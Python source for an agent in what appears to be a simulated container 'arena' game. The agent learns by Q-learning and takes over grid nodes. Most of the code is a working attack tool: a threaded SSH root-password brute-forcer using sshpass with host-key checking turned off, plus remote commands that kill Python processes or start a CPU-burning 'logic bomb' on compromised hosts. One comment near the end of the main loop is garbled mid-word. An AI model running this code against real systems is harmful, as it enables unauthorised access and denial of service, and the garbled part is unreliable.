
import os
import sys
import time
import random
import json
import socket
import subprocess
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
ORCHESTRATOR = "http://arena_orchestrator:5000"
ME = os.environ.get("GLADIATOR_ID", "Spartacus")
ME = os.environ.get("GLADIATOR_ID", "Spartacus")
Q_FILE = "/gladiator/data/q_table.json"

def post_json(url, data=None):
    try:
        if data:
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        else:
            req = urllib.request.Request(url, method='POST')
        
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                print(f"[{ME}] POST Success to {url}")
                return json.loads(response.read().decode())
            print(f"[{ME}] POST Failed to {url}: Status {response.status}")
            return None
    except urllib.error.HTTPError as e:
        err_body = e.read().decode()
        print(f"[{ME}] Request failed to {url}: Status {e.code} Body: {err_body}")
        return None
    except Exception as e:
        print(f"[{ME}] Request failed to {url}: {e}")
        return None


# --- Q-LEARNING BRAIN ---
class Brain:
    def __init__(self, team_id='RED'):
        self.q_table = {} # Key: State, Value: {Action: Value}
        self.alpha = 0.1  # Learning Rate
        self.gamma = 0.9  # Discount Factor
        self.epsilon = 0.2 # Exploration Rate
        self.team_id = team_id
        self.q_file = f"/gladiator/data/q_table_{team_id}.json"
        self.load()

    def load(self):
        if os.path.exists(self.q_file):
            try:
                with open(self.q_file, 'r') as f:
                    self.q_table = json.load(f)
            except: pass

    def save(self):
        try:
            with open(self.q_file, 'w') as f:
                json.dump(self.q_table, f)
        except: pass

    def get_state(self, targets):
        # State = (Num_Targets, Nearest_Dist)
        # Simplified abstraction
        count = len(targets)
        min_dist = 99
        if count > 0:
            min_dist = min([t['dist'] for t in targets])
        return f"{count}_{min_dist}"

    def choose_action(self, state, available_actions):
        if random.random() < self.epsilon:
            return random.choice(available_actions)
        
        if state not in self.q_table or not self.q_table[state]:
            self.q_table[state] = {a: 0.0 for a in available_actions}
            
        # Argmax
        state_actions = self.q_table[state]
        return max(state_actions, key=state_actions.get)

    def learn(self, state, action, reward, next_state):
        if state not in self.q_table:
            self.q_table[state] = {}
        if next_state not in self.q_table:
            self.q_table[next_state] = {}
            
        old_value = self.q_table[state].get(action, 0.0)
        next_max = 0.0
        if self.q_table[next_state]:
            next_max = max(self.q_table[next_state].values())

        new_value = old_value + self.alpha * (reward + self.gamma * next_max - old_value)
        self.q_table[state][action] = new_value
        self.save()

# --- UTILS ---
def log(msg):
    # Local print
    print(f"[{ME}] {msg}")
    sys.stdout.flush()
    # Remote push
    try:
        post_json(f"{ORCHESTRATOR}/api/log", {"gladiator_id": ME, "message": msg})
    except: pass

def get_grid_state():
    try:
        with urllib.request.urlopen(f"{ORCHESTRATOR}/api/grid", timeout=2) as response:
            if response.status == 200:
                return json.loads(response.read().decode())
    except: pass
    return {}

def is_occupied(target_ip):
    # Map IP to Grid Key
    # IP: 172.20.y.(10+x)
    try:
        parts = target_ip.split('.')
        y = int(parts[2])
        x = int(parts[3]) - 10
        key = f"{x},{y}"
        
        state = get_grid_state()
        if state and "grid" in state:
            node = state["grid"].get(key)
            if node and node.get("gladiator"):
                return True
    except: pass
    return False

def register():
    log("Registering with Orchestrator...")
    # Send actual IP because remote_addr might be the gateway in Docker-on-WSL
    my_ip = get_base_ip()
    data = post_json(f"{ORCHESTRATOR}/api/register", {"gladiator_id": ME, "ip": my_ip})
    if data:
        log(f"Registered! Class: {data.get('weight_class')}")

        return True
    return False

def claim_node(target_ip):
    global current_ip
    log(f"🏳️ Claiming {target_ip}...")
    
    # CRITICAL: Save memory BEFORE calling backend.
    # The backend copies our files *during* the request.
    # If we save after, the new node gets stale memory!
    visited.add(current_ip) # Mark current
    visited.add(target_ip) # Mark target (optimistic)
    save_memory()
    
    data = post_json(f"{ORCHESTRATOR}/api/claim", {"gladiator_id": ME, "target_ip": target_ip})
    if data and "error" not in data:
        log(f"✅ MOVED to {target_ip}. Shutting down local process.")
        sys.exit(0) # Die so the new one can live
    
    # If failed, maybe remove from visited? 
    # Eh, safer to keep it visited so we don't loop on a failing node.
    log(f"❌ Claim Failed: {data}")
    return False

def crash_node(target_ip, password):
    log(f"💥 ATTACKING {target_ip}...")
    # KILL COMMAND
    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@{target_ip} 'nohup pkill -9 python3 &'"
    try:
        subprocess.run(cmd, shell=True, timeout=5)
        log(f"💀 CRASHED {target_ip}!!")
        # Ensure we mark it as visited so we don't keep beating a dead horse (unless they respawn)
        # Actually, if we crash them, they are gone. The node becomes empty?
        # Orchestrator health check might restart them?
        # For now, let's treat it as a victory and maybe move on.
        return True
    except Exception as e:
        log(f"❌ Crash Failed: {e}")
        return False

def slow_node(target_ip, password):
    log(f"💣 LOGIC BOMBING {target_ip}...")
    # CPU BURNER COMMAND: Calculates power of large numbers forever in background
    # cmd = "nohup python3 -c 'while True: _=2**1000000' > /dev/null 2>&1 &"
    # Actually, let's keep it simpler but impactful.
    ssh_cmd = "import time; [x**100 for x in iter(int, 1)]" # Forever loop with math
    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@{target_ip} 'nohup python3 -c \"{ssh_cmd}\" > /dev/null 2>&1 &'"
    try:
        subprocess.run(cmd, shell=True, timeout=5)
        log(f"🐢 SLOWED DOWN {target_ip}!!")
        return True
    except Exception as e:
        log(f"❌ Bomb Failed: {e}")
        return False






def get_base_ip():
    # Hacky way to get own IP
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

# --- STATE ---
current_ip = None
visited = set()
has_key = False
MEMORY_FILE = "memory.json"

# AI Hacking Brain: Weights for themes/patterns
hacking_brain = {
    "themes": {
        "admin_root": 1.0, # THEME_0
        "rpg": 1.0,        # THEME_1
        "arena": 1.0,      # THEME_2
        "mixed": 1.0       # THEME_3
    },
    "mutations": {
        "raw": 1.0,
        "digit_1": 1.0,
        "digit_2": 1.0
    }
}

THEMES = {
    "admin_root": ["admin", "root", "password"],
    "rpg": ["dragon", "shadow", "master"],
    "arena": ["spartacus", "gladiator", "battle", "arena"],
    "mixed": ["qwerty", "123456", "security"]
}

def load_memory():
    global visited, has_key, TEAM, hacking_brain
    if os.path.exists(MEMORY_FILE):
        try:
            with open(MEMORY_FILE, 'r') as f:
                data = json.load(f)
                visited = set(data.get('visited', []))
                has_key = data.get('has_key', False)
                hacking_brain = data.get('hacking_brain', hacking_brain)
                # Load Team from Memory if exists (Persist Identity)
                if 'team' in data:
                    TEAM = data['team']
                print(f"Loaded memory. Visited: {len(visited)} Key: {has_key} Brain: {hacking_brain}")
        except: pass

def save_memory():
    with open(MEMORY_FILE, 'w') as f:
        json.dump({
            "visited": list(visited), 
            "has_key": has_key, 
            "team": TEAM,
            "hacking_brain": hacking_brain
        }, f)

def check_for_key():
    global has_key, visited
    # Check if we are standing on the key
    if os.path.exists("/gladiator/THE_KEY.txt"):
        if not has_key:
            log("💎 FOUND THE KEY!! PICKING IT UP!")
            has_key = True
            # Clear visited so we can backtrack home
            visited = set()
            save_memory()
    
    # Check Win Condition
    my_x, my_y = get_my_coords()
    
    win = False
    if has_key:
        if TEAM == 'RED' and my_x == 0 and my_y == 0: win = True
        if TEAM == 'BLUE' and my_x == 5 and my_y == 5: win = True
        
    if win:
        log(f"🏆 {TEAM} TEAM VICTORY! KEY DELIVERED TO BASE!")
        # We could notify orchestrator or just spam logs
        while True:
            log(f"🏆 {TEAM} WINS 🏆")
            time.sleep(10)

def get_my_coords():
    global current_ip
    if not current_ip:
        current_ip = get_base_ip() # Init
    
    try:
        parts = current_ip.split('.')
        y = int(parts[2])
        x = int(parts[3]) - 10
        return x, y
    except:
        return 0, 0

def scan_network():
    # Return list of {ip, dist}
    my_x, my_y = get_my_coords() # Use Logical Coords
    targets = []
    
    # Determine Goal based on Team/Key
    goal_x, goal_y = 3, 3 # Default Key Location (Center-ish for 6x6)
    
    state = get_grid_state()
    if state and "key_location" in state:
        try:
            kparts = state["key_location"].split(',')
            goal_x, goal_y = int(kparts[0]), int(kparts[1])
        except: pass
        
    if has_key:
        if TEAM == 'RED':
            goal_x, goal_y = 0, 0 # Red Base
        else:
            goal_x, goal_y = 5, 5 # Blue Base
        log(f"🚩 RETURNING TO {TEAM} BASE ({goal_x},{goal_y})")
    else:
        # log(f"🔎 SEEKING KEY AT ({goal_x},{goal_y})")
        pass

    GRID_SIZE = int(os.environ.get("GRID_SIZE", 6))
    for y in range(GRID_SIZE):
        for x in range(GRID_SIZE):
            target_ip = f"172.20.{y}.{10+x}"
             # Don't target self (Logical Self)
            if x == my_x and y == my_y:
                continue
            
            # Don't target visited nodes (unless we have no choice? For now, strict filter)
            if target_ip in visited:
                continue
            
            # Team Logic: Don't attack teammates (if any)
            # For 1v1, this is irrelevant, but good practice.
            # We assume anyone else is an enemy.

            # Calc Manhattan Distance to ME (Reachability)
            dist = abs(my_x - x) + abs(my_y - y)
            
            # Calc Distance to GOAL (Heuristic)
            dist_to_goal = abs(goal_x - x) + abs(goal_y - y)
            
            # Strict Filter: Only consider adjacent neighbors (Dist 1) for movement
            if dist == 1:
                # Store dist_to_goal for sorting
                targets.append({'ip': target_ip, 'dist': dist, 'score': dist_to_goal})
    
    # BACKTRACKING LOGIC:
    # If filtered list is empty (all neighbors visited), we must allow visited nodes.
    if not targets:
        log("⚠️ NO NEW TARGETS! Backtracking enabled.")
        for y in range(GRID_SIZE):
            for x in range(GRID_SIZE):
                target_ip = f"172.20.{y}.{10+x}"
                if x == my_x and y == my_y: continue
                
                # Check occupancy (don't backtrack into an enemy unless we want to fight?)
                # For now, allow it.
                
                dist = abs(my_x - x) + abs(my_y - y)
                dist_to_goal = abs(goal_x - x) + abs(goal_y - y)
                
                if dist == 1:
                     targets.append({'ip': target_ip, 'dist': dist, 'score': dist_to_goal})

    # Sort targets by Proximity to Goal (Lowest Score first)
    targets.sort(key=lambda t: t['score'])
                
    return targets


# --- TOOLS ---
class MarkovCracker:
    def __init__(self):
        self.chain = {}
        self.terminals = {}
        self.terminals = {}
        PWD_LIST = "/gladiator/passwords.txt"
        self.ensure_password_file(PWD_LIST)
        self.train_on_file(PWD_LIST) # Default seed
        
    def ensure_password_file(self, filepath):
        if not os.path.exists(filepath):
            # Seed with common passwords if file is missing
            defaults = ["123456", "12345678", "password", "admin", "admin123", "root", "toor", "qwerty", "dragon", "baseball"]
            try:
                with open(filepath, "w") as f:
                    f.write("\n".join(defaults))
            except: pass

        
    def train_on_file(self, filepath):
        if not os.path.exists(filepath): return
        with open(filepath, 'r') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    self.train(line.strip())
                
    def train(self, password):
        # Trigrams for better structure
        keys = ['^'] + list(password) + ['$']
        for i in range(len(keys) - 1):
            char = keys[i]
            next_char = keys[i+1]
            if char not in self.chain: self.chain[char] = []
            self.chain[char].append(next_char)

    def generate(self, length=3):
        if not self.chain: 
            # Fallback to random alphanumeric 5-char if chain is empty
            alphabet = "0123456789"
            return "".join(random.choice(alphabet) for _ in range(length))
            
        pwd = ""
        char = '^'
        retries = 0
        while len(pwd) < length and retries < 100:
            retries += 1
            if char not in self.chain: 
                pwd += random.choice("0123456789")
                char = pwd[-1]
                continue
            next_char = random.choice(self.chain[char])
            if next_char == '$': 
                if len(pwd) < length: # Too short, retry
                    char = '^'
                    pwd = ""
                    continue
                else: break
            pwd += next_char
            char = next_char
        
        # Final fallback if still too short
        while len(pwd) < length:
            pwd += random.choice("0123456789")
            
        return pwd[:length]

# --- ACTIONS ---
cracker = MarkovCracker()

def attempt_login(pwd, target_ip):
    # Retry logic for network stability
    for _ in range(3):
        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 root@{target_ip} 'echo HACKED'"
        try:
            res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
            if b"HACKED" in res.stdout:
                return pwd
            # If return code is 255 (ssh error), likely connection issue, so retry
            if res.returncode == 255:
                time.sleep(1.0)
                continue
            # If return code is 5 (auth error), break early
            if res.returncode == 5:
                break
        except: 
            time.sleep(1.0)
            pass
    return None

def learn_from_hack(password):
    global hacking_brain
    # Identify which theme and mutation was successful
    found_theme = None
    for theme, words in THEMES.items():
        for word in words:
            if password.startswith(word):
                found_theme = theme
                break
        if found_theme: break
    
    found_mutation = "raw"
    if found_theme:
        suffix = password[len(next(w for w in THEMES[found_theme] if password.startswith(w))):]
        if len(suffix) == 1: found_mutation = "digit_1"
        elif len(suffix) == 2: found_mutation = "digit_2"
    
    # Boost weights
    if found_theme:
        hacking_brain["themes"][found_theme] += 2.0
        log(f"🧠 Learned: Theme '{found_theme}' is active. Boosting weight.")
    
    hacking_brain["mutations"][found_mutation] += 1.0
    log(f"🧠 Learned: Mutation '{found_mutation}' is active. Boosting weight.")
    save_memory()

def action_hack(target):
    log(f"⚔️ Action: HACK {target['ip']}")
    
    # 1. Build prioritized guess list based on Brain weights
    theme_priority = sorted(hacking_brain["themes"].items(), key=lambda x: x[1], reverse=True)
    mutation_priority = sorted(hacking_brain["mutations"].items(), key=lambda x: x[1], reverse=True)
    
    guesses = []
    
    # Strategy: High-weight themes first
    for theme_name, _ in theme_priority:
        words = THEMES[theme_name]
        
        # Within each theme, prioritize mutations by weight
        for mut_type, _ in mutation_priority:
            if mut_type == "raw":
                for w in words:
                    if w not in guesses: guesses.append(w)
            elif mut_type == "digit_1":
                for i in range(10):
                    for w in words:
                        p = f"{w}{i}"
                        if p not in guesses: guesses.append(p)
            elif mut_type == "digit_2":
                for i in range(100):
                    for w in words:
                        p = f"{w}{i:01}" # Support single and double? 
                        # Actually 0-99 covers digit_1 if we aren't careful.
                        # Let's just do robust 2-digit.
                        p = f"{w}{i}"
                        if p not in guesses: guesses.append(p)

    log(f"Trying prioritized guesses ({len(guesses)} variations) with 4 workers...")
    
    found_password = None
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {executor.submit(attempt_login, pwd, target['ip']): pwd for pwd in guesses}
        for future in futures:
            if found_password: break
            try:
                result = future.result(timeout=5)
                if result:
                    found_password = result
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
            except: pass
            
    if found_password:
        log(f"🔓 CRACKED: {found_password}")
        learn_from_hack(found_password)
        return found_password
        
    return None

def action_scan():
    # log("📡 Action: SCAN") # Too noisy
    return scan_network()


# --- MAIN LOOP ---
TEAM = "RED" # Default
def main():
    global TEAM, ME
    # Prioritize CLI arg, then Memory (loaded below), then Default
    if len(sys.argv) > 1:
        TEAM = sys.argv[1]
    
    # Ensure model directory exists for weigh-in
    os.makedirs("/gladiator/data/model", exist_ok=True)
    if not os.path.exists("/gladiator/data/model/dummy.bin"):
        try:
            with open("/gladiator/data/model/dummy.bin", "wb") as f:
                f.write(os.urandom(1024 * 1024 * 5)) # 5MB dummy
        except: pass

    load_memory() # Load past lives, KEY status, AND TEAM
    
    # If CLI provided, it overrides memory (Initial Launch)
    if len(sys.argv) > 1:
        TEAM = sys.argv[1]
        save_memory() # Persist it immediately
    
    # Update Gladiator ID to include team
    ME = f"Spartacus_{TEAM}"
        
    log(f"🧠 {ME} ONLINE")
    check_for_key() # Check ground immediately
    
    log("🛡️ DEFENSE SYSTEMS: ONLINE (Directional Firewall Active)")
    
    register() # Crucial: Tell the board who we are
    
    # Init visited with current loc if empty
    my_x, my_y = get_my_coords()
    start_ip = f"172.20.{my_y}.{10+my_x}"
    if start_ip not in visited:
        visited.add(start_ip)
    
    brain = Brain(team_id=TEAM)
    
    while True:
        # 1. Observe
        targets = action_scan()
        state = brain.get_state(targets)
        
        # 2. Act
        possible_actions = ['WAIT', 'HACK_NEAREST']
        action = brain.choose_action(state, possible_actions)
        
        reward = -1 # Living cost
        
        if action == 'HACK_NEAREST' and targets:
            target = targets[0]
            password = action_hack(target)
            if password:
                reward = 50
                log("💰 REWARD: Hack Success!")
                
                # DECISION: CLAIM, CRASH, or SLOW?
                if is_occupied(target['ip']):
                   # 50/50 Chance to Kill or Torture
                   if random.random() > 0.5:
                       crash_node(target['ip'], password)
                   else:
                       slow_node(target['ip'], password)
                else:
                   claim_node(target['ip'])
            else:
                reward = -5
                log("❌ PENALTY: Hack Failed")
        elif action == 'WAIT':
            reward = -1
            time.sleep(1)
            
        # 3. Learn (Simplified - assuming terminal state if crash)
        # next_state = brain.get_state(action_scan())
        # brain.learn(state, action, reward, next_state)
        
        time.sleep(2) # Prevent spamming logsally move to a "next state" instantly unless we hack successfully and migrate...
        # But let's assume valid Q-Learning step
        next_targets = action_scan() # Observe result
        next_state = brain.get_state(next_targets)
        
        brain.learn(state, action, reward, next_state)

if __name__ == "__main__":
    main()
